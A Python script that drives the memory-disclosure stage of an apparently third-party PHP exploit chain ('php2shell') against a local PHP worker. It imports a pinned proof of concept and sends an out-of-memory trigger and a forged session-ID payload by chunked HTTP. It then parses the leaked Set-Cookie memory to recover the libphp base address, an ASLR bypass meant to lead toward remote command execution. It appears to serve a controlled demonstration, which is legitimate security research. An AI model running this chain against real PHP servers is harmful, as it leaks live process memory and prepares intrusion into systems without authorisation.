#!/usr/bin/env python3
"""Run only the memory-disclosure stage of the php2shell chain.

This sends A1 (the OOM trigger) and B1 (the stale-session-ID leak). It does
not send A2/B2 and does not execute a command. The proof is a large
Set-Cookie header containing live worker memory.

The exploit code is third-party. This script only drives the pinned PoC.
"""
from __future__ import annotations

import argparse
import os
import socket
import subprocess
import sys
import tempfile
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def wake_worker(port: int) -> None:
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=3)
        s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n")
        s.recv(1024)
        s.close()
    except OSError:
        pass


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=18088)
    ap.add_argument("--poc-dir", default=os.path.join(ROOT, ".poc", "php2shell-bypass-aslr-exp"))
    ap.add_argument("--timeout", type=float, default=300.0)
    ap.add_argument("--retries", type=int, default=5)
    ap.add_argument("--save", default="", help="optional path to save the raw response")
    args = ap.parse_args()

    if not os.path.isfile(os.path.join(args.poc_dir, "exploit.py")):
        print("[-] PoC not found. Run ./scripts/fetch-poc.sh first.", file=sys.stderr)
        return 1

    sys.path.insert(0, args.poc_dir)
    import exploit as poc  # type: ignore

    tmp = tempfile.mkdtemp(prefix="php2shell-leak-")
    a1 = os.path.join(tmp, "a1.bin")
    b1 = os.path.join(tmp, "b1.bin")
    leak = args.save or os.path.join(tmp, "leak.resp")

    for attempt in range(1, args.retries + 1):
        wake_worker(args.port)
        print(f"[try {attempt}] A1: OOM during session-cookie cleanup")
        subprocess.run(
            [sys.executable, os.path.join(poc.PURE, "mk_a1.py"), "--out", a1, "--big", "78"],
            check=True,
            stdout=subprocess.DEVNULL,
        )
        poc.send_chunked(args.port, "/index.php" + poc.Q, a1, 180)
        time.sleep(0.2)

        print(f"[try {attempt}] B1: stale session ID -> forged zend_string -> Set-Cookie leak")
        subprocess.run(
            [
                sys.executable,
                os.path.join(poc.PURE, "mk_leak_b.py"),
                "--out",
                b1,
                "--spec",
                poc.LEAK_SPEC,
                "--fake-len",
                "0xC8000",
                "--tag",
            ],
            check=True,
            stdout=subprocess.DEVNULL,
        )

        try:
            resp = poc.send_chunked(args.port, "/index.php", b1, args.timeout, leak)
            info = poc.parse_leak(resp)
        except Exception as exc:
            print(f"      leak failed: {exc!r}")
            time.sleep(0.3)
            continue

        print()
        print(f"response bytes:       {len(resp)}")
        print(f"decoded cookie bytes: {info['decoded']}")
        print(f"most common pointer:  {info['zdtor']:#x}")
        print(f"derived libphp base:  {info['lib']:#x}")
        print("main chunk candidates:")
        for cand in info["main_candidates"]:
            print(f"  {cand:#x}")
        print("bucket counts:")
        for bucket, count in info["buckets"].most_common(6):
            print(f"  {bucket:#x}  {count}")

        print()
        print("[!] The cookie contains live worker memory. Do not paste it into")
        print("[!] reports or tickets. The numbers above are enough for the demo.")
        if args.save:
            print(f"[!] Raw response saved to {args.save}")

        return 0 if info["decoded"] > 100_000 and info["lib"] else 1

    print("[-] all leak attempts failed. Restart the target and try again.", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
